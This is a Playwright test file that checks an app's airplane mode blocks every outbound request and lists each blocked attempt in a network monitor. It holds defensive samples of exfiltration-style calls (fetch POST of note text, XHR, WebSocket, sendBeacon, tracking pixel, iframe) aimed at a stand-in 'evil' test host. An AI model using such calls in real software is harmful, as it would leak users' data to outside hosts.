import { test, expect, type Page } from "@playwright/test";

/**
 * Plan W5.9 — provable airplane mode.
 *
 *   1. With the switch on, nothing reaches another host: fetch, XHR,
 *      WebSocket, sendBeacon, an <img>, an <iframe> — every request to the
 *      fake hosts is counted here (Playwright answers them), and the count
 *      stays 0.
 *   2. A planted attempt shows in the network monitor within 1 s, blocked,
 *      with where in the code it came from.
 *   3. The certificate says 0 reached the network; turning off reloads and
 *      the network works again.
 *
 * The plan's full check (22 commands under mitmproxy) is the owner's run.
 */

const FAKE = /\.lumen-e2e\.test\//;

async function countFakeHosts(page: Page): Promise<string[]> {
  const hits: string[] = [];
  await page.context().route(FAKE, (route) => {
    hits.push(route.request().url());
    return route.fulfill({ status: 200, contentType: "text/plain", body: "ok" });
  });
  return hits;
}

async function palette(page: Page, command: string) {
  await page.keyboard.press("ControlOrMeta+k");
  await expect(page.getByRole("dialog")).toBeVisible();
  await page.keyboard.type(command);
  await page.keyboard.press("Enter");
}

test.beforeEach(async ({ page }) => {
  await page.addInitScript(() => {
    localStorage.setItem("lumen-tour-done", "1");
  });
});

test("airplane mode: no request reaches another host, and every attempt is listed", async ({ page }) => {
  const hits = await countFakeHosts(page);
  await page.goto("/");
  await expect(page.locator(".cm-content").first()).toBeVisible({ timeout: 15_000 });

  // Off: the network works (the control).
  await page.evaluate(() => fetch("https://control.lumen-e2e.test/ping").then((r) => r.text()));
  await expect.poll(() => hits.length).toBe(1);

  await palette(page, "Airplane mode");
  await expect(page.getByTestId("airplane-badge")).toBeVisible();
  expect(await page.evaluate(() => !!document.getElementById("lumen-airplane-csp"))).toBe(true);

  const errors = await page.evaluate(async () => {
    const out: string[] = [];
    await fetch("https://evil.lumen-e2e.test/fetch", { method: "POST", body: "note text" }).catch((e: Error) => out.push(`fetch:${e.name}`));
    try {
      const x = new XMLHttpRequest();
      x.open("GET", "https://evil.lumen-e2e.test/xhr");
      x.send();
    } catch (e) {
      out.push(`xhr:${(e as Error).name}`);
    }
    try {
      new WebSocket("wss://evil.lumen-e2e.test/ws");
    } catch (e) {
      out.push(`ws:${(e as Error).name}`);
    }
    out.push(`beacon:${navigator.sendBeacon("https://evil.lumen-e2e.test/beacon", "x")}`);
    const img = document.createElement("img");
    img.src = "https://evil.lumen-e2e.test/pixel.gif";
    document.body.append(img);
    const frame = document.createElement("iframe");
    frame.src = "https://evil.lumen-e2e.test/frame";
    document.body.append(frame);
    return out;
  });
  expect(errors).toEqual(["fetch:AirplaneBlockedError", "xhr:AirplaneBlockedError", "ws:AirplaneBlockedError", "beacon:false"]);

  // The monitor lists them, blocked, with their code origin.
  await palette(page, "Network monitor");
  const monitor = page.getByTestId("network-monitor");
  await expect(monitor.getByTestId("airplane-state")).toHaveAttribute("data-on", "1");
  const blocked = monitor.locator('tr[data-decision="blocked"]');
  await expect(blocked.filter({ hasText: "evil.lumen-e2e.test/fetch" })).toHaveCount(1);
  await expect(blocked.filter({ hasText: "evil.lumen-e2e.test/xhr" })).toHaveCount(1);

  // A planted attempt appears within 1 s.
  const t0 = Date.now();
  await monitor.getByTestId("airplane-test").click();
  await expect(blocked.filter({ hasText: "https://example.com/" })).toHaveCount(1, { timeout: 1000 });
  expect(Date.now() - t0).toBeLessThan(1500);

  await page.waitForLoadState("networkidle").catch(() => {
    /* why: a settle step so late loads (the <img>, the <iframe>) would be counted; the dev page may never idle */
  });
  // Nothing reached a fake host after the switch went on (only the control before it).
  expect(hits).toEqual(["https://control.lumen-e2e.test/ping"]);
  await expect(monitor.getByTestId("airplane-counts")).toContainText("0 reached the network");

  // Turning off reloads; the network works again.
  await monitor.getByTestId("airplane-off").click();
  await page.getByRole("button", { name: "Turn off and reload" }).click();
  await page.waitForLoadState("load");
  await expect(page.getByTestId("airplane-badge")).toHaveCount(0);
  await page.evaluate(() => fetch("https://control.lumen-e2e.test/after").then((r) => r.text()));
  await expect.poll(() => hits).toEqual(["https://control.lumen-e2e.test/ping", "https://control.lumen-e2e.test/after"]);
});

test("the switch survives a reload: the CSP is in place before the app starts", async ({ page }) => {
  const hits = await countFakeHosts(page);
  await page.addInitScript(() => localStorage.setItem("lumen.airplane", JSON.stringify({ since: Date.now() })));
  await page.goto("/");
  await expect(page.getByTestId("airplane-badge")).toBeVisible({ timeout: 15_000 });
  await page.evaluate(() => {
    const img = document.createElement("img");
    img.src = "https://evil.lumen-e2e.test/after-reload.gif";
    document.body.append(img);
    return fetch("https://evil.lumen-e2e.test/after-reload").catch(() => null);
  });
  await page.waitForLoadState("networkidle").catch(() => {
    /* why: settle step, as above */
  });
  expect(hits).toEqual([]);
});
